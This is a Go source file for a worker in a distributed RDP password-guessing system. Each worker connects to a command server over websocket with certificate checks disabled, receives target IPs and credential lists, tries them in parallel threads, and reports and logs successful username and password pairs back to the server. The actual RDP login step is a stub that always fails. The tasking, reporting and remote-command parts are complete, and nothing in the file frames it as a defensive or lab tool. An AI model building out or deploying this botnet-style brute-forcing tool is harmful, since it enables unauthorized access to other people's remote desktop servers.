package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
)

// Configuration embedded at compile time
var (
	ServerURL   string
	WorkerID    string
	WorkerToken string
)

type Config struct {
	ServerURL string `json:"serverUrl"`
	WorkerID  string `json:"workerId"`
	Token     string `json:"token"`
}

type Task struct {
	ID          string       `json:"id"`
	TargetIP    string       `json:"target_ip"`
	TargetPort  int          `json:"target_port"`
	Credentials []Credential `json:"credentials"`
	Config      TaskConfig   `json:"config"`
}

type TaskConfig struct {
	ThreadsPerWorker     int `json:"threadsPerWorker"`
	Timeout              int `json:"timeout"`
	RetryAttempts        int `json:"retryAttempts"`
	DelayBetweenAttempts int `json:"delayBetweenAttempts"`
}

type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type Result struct {
	TaskID   string `json:"taskId"`
	IP       string `json:"ip"`
	Port     int    `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
	Error    string `json:"error,omitempty"`
	WorkerID string `json:"workerId"`
}

type Worker struct {
	conn          *websocket.Conn
	config        Config
	tasks         chan Task
	results       chan Result
	status        WorkerStatus
	mu            sync.RWMutex
	stopChan      chan struct{}
	wg            sync.WaitGroup
	attemptCount  int64
	successCount  int64
	lastPPSUpdate time.Time
}

type WorkerStatus struct {
	Status          string  `json:"status"`
	PPS             float64 `json:"pps"`
	TasksCompleted  int     `json:"tasksCompleted"`
	Attempts        int     `json:"attempts"`
	Successes       int     `json:"successes"`
	CurrentTargetIP string  `json:"currentTargetIp,omitempty"`
}

func main() {
	// Load configuration
	config := loadConfig()
	
	// Create worker
	worker := NewWorker(config)
	
	// Connect to server
	if err := worker.Connect(); err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}
	defer worker.Close()
	
	// Start worker
	worker.Start()
	
	// Keep running
	select {}
}

func loadConfig() Config {
	// Try to load from embedded config first
	if ServerURL != "" {
		return Config{
			ServerURL: ServerURL,
			WorkerID:  WorkerID,
			Token:     WorkerToken,
		}
	}
	
	// Try to load from config file
	configFile := "config.json"
	if len(os.Args) > 1 {
		configFile = os.Args[1]
	}
	
	data, err := os.ReadFile(configFile)
	if err != nil {
		log.Fatalf("Failed to read config file: %v", err)
	}
	
	var config Config
	if err := json.Unmarshal(data, &config); err != nil {
		log.Fatalf("Failed to parse config: %v", err)
	}
	
	return config
}

func NewWorker(config Config) *Worker {
	return &Worker{
		config:        config,
		tasks:         make(chan Task, 100),
		results:       make(chan Result, 1000),
		stopChan:      make(chan struct{}),
		lastPPSUpdate: time.Now(),
	}
}

func (w *Worker) Connect() error {
	dialer := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true, // For self-signed certificates
		},
	}
	
	headers := map[string][]string{
		"Authorization": {fmt.Sprintf("Bearer %s", w.config.Token)},
	}
	
	conn, _, err := dialer.Dial(w.config.ServerURL+"/socket.io/?transport=websocket", headers)
	if err != nil {
		return err
	}
	
	w.conn = conn
	return nil
}

func (w *Worker) Close() {
	close(w.stopChan)
	w.wg.Wait()
	if w.conn != nil {
		w.conn.Close()
	}
}

func (w *Worker) Start() {
	// Start goroutines
	w.wg.Add(4)
	go w.messageHandler()
	go w.taskProcessor()
	go w.resultSender()
	go w.statusReporter()
	
	// Send initial status
	w.sendStatus("online")
	
	// Request first task
	w.requestTask()
}

func (w *Worker) messageHandler() {
	defer w.wg.Done()
	
	for {
		select {
		case <-w.stopChan:
			return
		default:
			messageType, message, err := w.conn.ReadMessage()
			if err != nil {
				log.Printf("Read error: %v", err)
				return
			}
			
			if messageType == websocket.TextMessage {
				w.handleMessage(message)
			}
		}
	}
}

func (w *Worker) handleMessage(message []byte) {
	var msg map[string]interface{}
	if err := json.Unmarshal(message, &msg); err != nil {
		log.Printf("Failed to parse message: %v", err)
		return
	}
	
	switch msg["type"] {
	case "task":
		var task Task
		if taskData, ok := msg["data"].(map[string]interface{}); ok {
			taskJSON, _ := json.Marshal(taskData)
			if err := json.Unmarshal(taskJSON, &task); err == nil {
				w.tasks <- task
			}
		}
		
	case "ping":
		w.sendMessage("pong", nil)
		
	case "no-task":
		// Wait before requesting again
		time.Sleep(5 * time.Second)
		w.requestTask()
		
	case "command":
		// Handle commands from server
		if cmd, ok := msg["data"].(string); ok {
			w.handleCommand(cmd)
		}
	}
}

func (w *Worker) taskProcessor() {
	defer w.wg.Done()
	
	for {
		select {
		case <-w.stopChan:
			return
		case task := <-w.tasks:
			w.processTask(task)
			w.requestTask() // Request next task
		}
	}
}

func (w *Worker) processTask(task Task) {
	log.Printf("Processing task %s: %s:%d with %d credentials",
		task.ID, task.TargetIP, task.TargetPort, len(task.Credentials))
	
	// Update status
	w.mu.Lock()
	w.status.CurrentTargetIP = task.TargetIP
	w.mu.Unlock()
	
	// Process credentials in parallel
	threads := task.Config.ThreadsPerWorker
	if threads == 0 {
		threads = 10
	}
	
	semaphore := make(chan struct{}, threads)
	var wg sync.WaitGroup
	
	for _, cred := range task.Credentials {
		wg.Add(1)
		semaphore <- struct{}{}
		
		go func(c Credential) {
			defer wg.Done()
			defer func() { <-semaphore }()
			
			success := w.testRDP(task.TargetIP, task.TargetPort, c, task.Config)
			
			atomic.AddInt64(&w.attemptCount, 1)
			if success {
				atomic.AddInt64(&w.successCount, 1)
			}
			
			result := Result{
				TaskID:   task.ID,
				IP:       task.TargetIP,
				Port:     task.TargetPort,
				Username: c.Username,
				Password: c.Password,
				Success:  success,
				WorkerID: w.config.WorkerID,
			}
			
			if !success {
				result.Error = "Authentication failed"
			}
			
			w.results <- result
		}(cred)
	}
	
	wg.Wait()
	
	// Task complete
	w.mu.Lock()
	w.status.TasksCompleted++
	w.status.CurrentTargetIP = ""
	w.mu.Unlock()
	
	// Send task complete notification
	w.sendMessage("task-complete", map[string]interface{}{
		"taskId": task.ID,
		"result": map[string]interface{}{
			"completed": true,
			"attempts":  len(task.Credentials),
		},
	})
}

func (w *Worker) testRDP(ip string, port int, cred Credential, config TaskConfig) bool {
	timeout := time.Duration(config.Timeout) * time.Millisecond
	if timeout == 0 {
		timeout = 5 * time.Second
	}
	
	// Try to connect with retries
	for attempt := 0; attempt <= config.RetryAttempts; attempt++ {
		if attempt > 0 {
			time.Sleep(time.Duration(config.DelayBetweenAttempts) * time.Millisecond)
		}
		
		success := w.attemptRDPConnection(ip, port, cred, timeout)
		if success {
			return true
		}
	}
	
	return false
}

func (w *Worker) attemptRDPConnection(ip string, port int, cred Credential, timeout time.Duration) bool {
	// This is a simplified RDP connection test
	// In production, you would use a proper RDP library with NLA support
	
	address := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	
	// Send RDP initial connection request
	// This is where you would implement actual RDP protocol with NLA
	// For demonstration, we're doing a basic TCP check
	
	// Set deadline for operations
	conn.SetDeadline(time.Now().Add(timeout))
	
	// RDP Protocol Implementation would go here
	// Including:
	// - X.224 Connection Request
	// - MCS Connect Initial
	// - NLA Authentication
	// - etc.
	
	// For now, return false as this is just a framework
	return false
}

func (w *Worker) resultSender() {
	defer w.wg.Done()
	
	batch := make([]Result, 0, 100)
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.stopChan:
			// Send remaining results
			if len(batch) > 0 {
				w.sendResults(batch)
			}
			return
			
		case result := <-w.results:
			batch = append(batch, result)
			
			// Send batch if full
			if len(batch) >= 100 {
				w.sendResults(batch)
				batch = batch[:0]
			}
			
		case <-ticker.C:
			// Send batch periodically
			if len(batch) > 0 {
				w.sendResults(batch)
				batch = batch[:0]
			}
		}
	}
}

func (w *Worker) sendResults(results []Result) {
	for _, result := range results {
		if result.Success {
			log.Printf("SUCCESS: %s:%d - %s:%s", result.IP, result.Port, result.Username, result.Password)
		}
		
		w.sendMessage("result", result)
	}
}

func (w *Worker) statusReporter() {
	defer w.wg.Done()
	
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-w.stopChan:
			return
		case <-ticker.C:
			w.updateAndSendStatus()
		}
	}
}

func (w *Worker) updateAndSendStatus() {
	now := time.Now()
	duration := now.Sub(w.lastPPSUpdate).Seconds()
	
	attempts := atomic.LoadInt64(&w.attemptCount)
	successes := atomic.LoadInt64(&w.successCount)
	
	w.mu.Lock()
	w.status.PPS = float64(attempts) / duration
	w.status.Attempts = int(attempts)
	w.status.Successes = int(successes)
	w.mu.Unlock()
	
	// Reset counters
	atomic.StoreInt64(&w.attemptCount, 0)
	atomic.StoreInt64(&w.successCount, 0)
	w.lastPPSUpdate = now
	
	w.sendStatus("online")
}

func (w *Worker) sendStatus(status string) {
	w.mu.RLock()
	statusCopy := w.status
	statusCopy.Status = status
	w.mu.RUnlock()
	
	w.sendMessage("status", statusCopy)
}

func (w *Worker) requestTask() {
	w.sendMessage("request-task", nil)
}

func (w *Worker) sendMessage(msgType string, data interface{}) {
	message := map[string]interface{}{
		"type": msgType,
		"data": data,
	}
	
	jsonData, err := json.Marshal(message)
	if err != nil {
		log.Printf("Failed to marshal message: %v", err)
		return
	}
	
	if err := w.conn.WriteMessage(websocket.TextMessage, jsonData); err != nil {
		log.Printf("Failed to send message: %v", err)
	}
}

func (w *Worker) handleCommand(cmd string) {
	switch cmd {
	case "stop":
		close(w.stopChan)
	case "restart":
		// Implement restart logic
	case "update":
		// Implement update logic
	}
}

func init() {
	// Set max procs for optimal performance
	runtime.GOMAXPROCS(runtime.NumCPU())
}